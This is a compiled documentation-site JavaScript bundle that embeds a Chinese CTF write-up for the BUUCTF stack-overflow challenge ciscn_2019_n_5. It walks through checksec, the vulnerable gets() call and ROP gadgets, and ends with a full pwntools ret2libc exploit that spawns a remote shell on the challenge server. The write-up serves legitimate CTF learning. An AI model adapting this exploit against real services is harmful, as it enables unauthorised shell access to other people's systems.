(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[166],{3905:function(e,n,t){"use strict";t.d(n,{Zo:function(){return c},kt:function(){return m}});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function p(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?p(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):p(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},p=Object.keys(e);for(r=0;r<p.length;r++)t=p[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var p=Object.getOwnPropertySymbols(e);for(r=0;r<p.length;r++)t=p[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var o=r.createContext({}),s=function(e){var n=r.useContext(o),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},c=function(e){var n=s(e.components);return r.createElement(o.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},u=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,p=e.originalType,o=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=s(t),m=a,_=u["".concat(o,".").concat(m)]||u[m]||d[m]||p;return t?r.createElement(_,i(i({ref:n},c),{},{components:t})):r.createElement(_,i({ref:n},c))}));function m(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var p=t.length,i=new Array(p);i[0]=u;var l={};for(var o in n)hasOwnProperty.call(n,o)&&(l[o]=n[o]);l.originalType=e,l.mdxType="string"==typeof e?e:a,i[1]=l;for(var s=2;s<p;s++)i[s]=t[s];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}u.displayName="MDXCreateElement"},4800:function(e,n,t){"use strict";t.r(n),t.d(n,{frontMatter:function(){return l},contentTitle:function(){return o},metadata:function(){return s},toc:function(){return c},default:function(){return u}});var r=t(2122),a=t(9756),p=(t(7294),t(3905)),i=["components"],l={title:"ciscn_2019_n_5",sidebar_position:16},o=void 0,s={unversionedId:"BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_n_5",id:"BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_n_5",isDocsHomePage:!1,title:"ciscn_2019_n_5",description:"\u77e5\u8bc6\u70b9",source:"@site/docs\\BUUCTF\\\u6808\u6ea2\u51fa\\ciscn_2019_n_5.md",sourceDirName:"BUUCTF/\u6808\u6ea2\u51fa",slug:"/BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_n_5",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_n_5",version:"current",sidebarPosition:16,frontMatter:{title:"ciscn_2019_n_5",sidebar_position:16},sidebar:"tutorialSidebar",previous:{title:"jarvisoj_level2_x64",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/jarvisoj_level2_x64"},next:{title:"ciscn_2019_ne_5",permalink:"/BUUCTF/\u6808\u6ea2\u51fa/ciscn_2019_ne_5"}},c=[{value:"\u77e5\u8bc6\u70b9",id:"\u77e5\u8bc6\u70b9",children:[]},{value:"\u89e3\u9898\u5206\u6790",id:"\u89e3\u9898\u5206\u6790",children:[]}],d={toc:c};function u(e){var n=e.components,t=(0,a.Z)(e,i);return(0,p.kt)("wrapper",(0,r.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,p.kt)("h3",{id:"\u77e5\u8bc6\u70b9"},"\u77e5\u8bc6\u70b9"),(0,p.kt)("ul",null,(0,p.kt)("li",{parentName:"ul"},"ROP\u6784\u9020"),(0,p.kt)("li",{parentName:"ul"},"ret2libc")),(0,p.kt)("h3",{id:"\u89e3\u9898\u5206\u6790"},"\u89e3\u9898\u5206\u6790"),(0,p.kt)("p",null,"checksec\u67e5\u770b\u4e00\u4e0b\u53d1\u73b0\u6ca1\u5f00\u4fdd\u62a4"),(0,p.kt)("pre",null,(0,p.kt)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ checksec --file=ciscn_2019_n_5 \nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified  Fortifiable     FILE\nPartial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   77) Symbols       No    0 2ciscn_2019_n_5\n")),(0,p.kt)("p",null,"\u62d6\u5165ida64\uff0c",(0,p.kt)("inlineCode",{parentName:"p"},"main"),"\u51fd\u6570\u5982\u4e0b\uff1a"),(0,p.kt)("pre",null,(0,p.kt)("code",{parentName:"pre",className:"language-c"},'int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char text[30]; // [rsp+0h] [rbp-20h] BYREF\n\n  setvbuf(stdout, 0LL, 2, 0LL);\n  puts("tell me your name");\n  read(0, name, 0x64uLL);\n  puts("wow~ nice name!");\n  puts("What do you want to say to me?");\n  //highlight-next-line\n  gets(text);\n  return 0;\n}\n')),(0,p.kt)("p",null,"\u5f88\u660e\u663e",(0,p.kt)("inlineCode",{parentName:"p"},"gets"),"\u53ef\u4ee5\u9020\u6210\u6808\u6ea2\u51fa\uff0c\u5728\u5de6\u4fa7\u5217\u8868\u4e2d\u6ca1\u627e\u5230",(0,p.kt)("inlineCode",{parentName:"p"},"system"),"\u51fd\u6570\uff0c\u9700\u8981\u81ea\u5df1\u8ba1\u7b97\u51fa\u6765\u3002\u53c8\u7531\u4e8ename\u662f\u5199\u5230bss\u6bb5\u7684\u5e76\u4e14\u4fdd\u62a4\u4e00\u4e2a\u90fd\u6ca1\u5f00\uff0c\u56e0\u6b64\u53ef\u4ee5\u5f97\u51fa\u4ee5\u4e0b\u4e24\u79cd\u601d\u8def\u3002"),(0,p.kt)("p",null,"\u7b2c\u4e00\u79cd\u89e3\u9898\u601d\u8def\u5982\u4e0b\uff1a"),(0,p.kt)("ol",null,(0,p.kt)("li",{parentName:"ol"},"\u5c06shellcode\u5199\u5165bss\u6bb5"),(0,p.kt)("li",{parentName:"ol"},"\u6808\u6ea2\u51fa\u8df3\u8f6c\u5230bss\u6bb5\u6267\u884c")),(0,p.kt)("p",null,"\u7b2c\u4e8c\u79cd\u89e3\u9898\u601d\u8def\u5982\u4e0b\uff1a"),(0,p.kt)("ol",null,(0,p.kt)("li",{parentName:"ol"},"\u6cc4\u9732",(0,p.kt)("inlineCode",{parentName:"li"},"puts"),"\u51fd\u6570\u7684\u5730\u5740"),(0,p.kt)("li",{parentName:"ol"},"\u8ba1\u7b97\u51fa",(0,p.kt)("inlineCode",{parentName:"li"},"system"),"\u51fd\u6570\u548c\u5b57\u7b26\u4e32",(0,p.kt)("inlineCode",{parentName:"li"},"/bin/sh"),"\u7684\u5730\u5740"),(0,p.kt)("li",{parentName:"ol"},"\u91cd\u65b0\u6267\u884c",(0,p.kt)("inlineCode",{parentName:"li"},"main"),"\u51fd\u6570\uff0c\u8c03\u7528",(0,p.kt)("inlineCode",{parentName:"li"},"system('/bin/sh')"))),(0,p.kt)("p",null,"\u5728ida64\u4e2d\u7528\u5feb\u6377\u952eCtrl + S\u67e5\u8be2\u5230bss\u6bb5\u5e76\u6ca1\u6709\u53ef\u6267\u884c\u6743\u9650\uff0c\u56e0\u6b64\u91c7\u7528\u7b2c\u4e8c\u79cd\u601d\u8def\u3002"),(0,p.kt)("p",null,"ROPgadget\u641c\u7d22\u7ed3\u679c\u5982\u4e0b\uff1a"),(0,p.kt)("pre",null,(0,p.kt)("code",{parentName:"pre",className:"language-bash"},'\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ ROPgadget --binary ciscn_2019_n_5 --only "pop|ret"\nGadgets information\n============================================================\n0x000000000040070c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x000000000040070e : pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000400710 : pop r14 ; pop r15 ; ret\n0x0000000000400712 : pop r15 ; ret\n0x000000000040070b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x000000000040070f : pop rbp ; pop r14 ; pop r15 ; ret\n0x00000000004005a0 : pop rbp ; ret\n//highlight-next-line\n0x0000000000400713 : pop rdi ; ret\n0x0000000000400711 : pop rsi ; pop r15 ; ret\n0x000000000040070d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n//highlight-next-line\n0x00000000004004c9 : ret\n0x0000000000400532 : ret 0x200a\n')),(0,p.kt)("p",null,"\u7b2c\u4e00\u6b65\u6cc4\u9732",(0,p.kt)("inlineCode",{parentName:"p"},"puts"),"\u51fd\u6570\u5730\u5740\u7684\u5173\u952e\u4ee3\u7801\u5982\u4e0b\uff1a"),(0,p.kt)("pre",null,(0,p.kt)("code",{parentName:"pre",className:"language-python"},"elf = ELF(file_name)\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi = 0x400713\n_start_addr = elf.symbols['_start']\n\nsh.sendlineafter('name', 'ruomo')\n\npayload1 = b'a' * 0x28 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)\nsh.sendlineafter('me?\\n', payload1)\nputs_addr = u64(sh.recvline()[:-1].ljust(8, b'\\x00'))\n")),(0,p.kt)("p",null,"\u7b2c\u4e8c\u6b65\u8ba1\u7b97",(0,p.kt)("inlineCode",{parentName:"p"},"system"),"\u51fd\u6570\u548c\u5b57\u7b26\u4e32",(0,p.kt)("inlineCode",{parentName:"p"},"/bin/sh"),"\u5730\u5740\u7684\u5173\u952e\u4ee3\u7801\u5982\u4e0b\uff1a"),(0,p.kt)("pre",null,(0,p.kt)("code",{parentName:"pre",className:"language-python"},"libc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsys_addr = libc_base + libc.dump('system')\nbin_sh_addr = libc_base + libc.dump('str_bin_sh')\n")),(0,p.kt)("p",null,"\u7b2c\u4e09\u6b65\u8c03\u7528\u5173\u952e\u4ee3\u7801\u5982\u4e0b\uff1a"),(0,p.kt)("pre",null,(0,p.kt)("code",{parentName:"pre",className:"language-python"},"sh.sendlineafter('name', 'ruomo')\n    \npayload2 = b'a' * 0x28 + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)\nsh.sendlineafter('me?\\n', payload2)\n")),(0,p.kt)("div",{className:"admonition admonition-info alert alert--info"},(0,p.kt)("div",{parentName:"div",className:"admonition-heading"},(0,p.kt)("h5",{parentName:"div"},(0,p.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,p.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"14",height:"16",viewBox:"0 0 14 16"},(0,p.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"}))),"\u63d0\u793a")),(0,p.kt)("div",{parentName:"div",className:"admonition-content"},(0,p.kt)("p",{parentName:"div"},"\u6211\u672c\u5730\u7684libc\u7248\u672c\u8fc7\u9ad8\uff0c\u76f4\u63a5\u672c\u5730\u6d4b\u8bd5\u4f1a\u51fa\u73b0libc\u7248\u672c\u641c\u7d22\u9519\u8bef\u7684\u95ee\u9898\uff0c\u9700\u8981elfpatch\u540e\u518d\u672c\u5730\u6d4b\u8bd5\u3002\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0alibc\u7248\u672c\u4e3a2.27\uff0c\u672c\u5730\u53ef\u7528glibc-all-in-one\u5de5\u5177\u4e0b\u8f7d2.27\u7248\u672c\u7684libc\u518delfpatch\u3002"))),(0,p.kt)("p",null,"\u6700\u7ec8\u5f97\u5230python\u811a\u672c\u5982\u4e0b\uff1a"),(0,p.kt)("pre",null,(0,p.kt)("code",{parentName:"pre",className:"language-python"},"from pwn import *\nfrom LibcSearcher import *\n\nis_debug = 0\nfile_name = './ciscn_2019_n_5'\nhost = 'node4.buuoj.cn'\nport = 26568\n\ndef main():\n    if is_debug:\n        sh = process(file_name)\n    else:\n        sh = remote(host, port)\n    \n    elf = ELF(file_name)\n    puts_plt = elf.plt['puts']\n    puts_got = elf.got['puts']\n    pop_rdi = 0x400713\n    ret_addr = 0x4004c9\n    _start_addr = elf.symbols['_start']\n    \n    sh.sendlineafter('name', 'ruomo')\n    \n    payload1 = b'a' * 0x28 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)\n    sh.sendlineafter('me?\\n', payload1)\n    puts_addr = u64(sh.recvline()[:-1].ljust(8, b'\\x00'))\n    \n    libc = LibcSearcher('puts', puts_addr)\n    libc_base = puts_addr - libc.dump('puts')\n    sys_addr = libc_base + libc.dump('system')\n    bin_sh_addr = libc_base + libc.dump('str_bin_sh')\n    \n    sh.sendlineafter('name', 'ruomo')\n    \n    payload2 = b'a' * 0x28 + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)\n    sh.sendlineafter('me?\\n', payload2)\n    \n    sh.interactive()\n\nif __name__ == '__main__':\n    main()\n")))}u.isMDXComponent=!0}}]);